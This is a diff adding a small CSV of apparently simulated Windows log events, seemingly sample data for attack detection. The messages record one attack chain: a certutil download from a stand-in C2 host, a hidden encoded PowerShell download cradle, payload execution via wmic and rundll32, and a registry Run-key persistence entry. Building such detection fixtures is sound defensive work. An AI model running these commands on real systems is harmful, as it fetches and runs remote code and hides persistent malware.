@@ -1,0 +1,5 @@
+timestamp,hostname,username,source_ip,destination_ip,message
+2026-09-08T11:15:00Z,WIN-WORKSTATION-01,jsmith,10.0.1.45,198.51.100.99,cmd.exe /c certutil -urlcache -split -f http://malicious-c2.net/beacon.bin %TEMP%\update.exe
+2026-09-08T11:15:20Z,WIN-WORKSTATION-01,jsmith,10.0.1.45,198.51.100.99,powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=
+2026-09-08T11:16:05Z,WIN-WORKSTATION-01,SYSTEM,10.0.1.45,10.0.1.1,wmic process call create "rundll32.exe C:\Windows\Temp\beacon.bin,EntryPoint"
+2026-09-08T11:16:40Z,WIN-WORKSTATION-01,SYSTEM,10.0.1.45,10.0.1.1,reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SecurityUpdate /t REG_SZ /d "C:\Windows\Temp\update.exe" /f
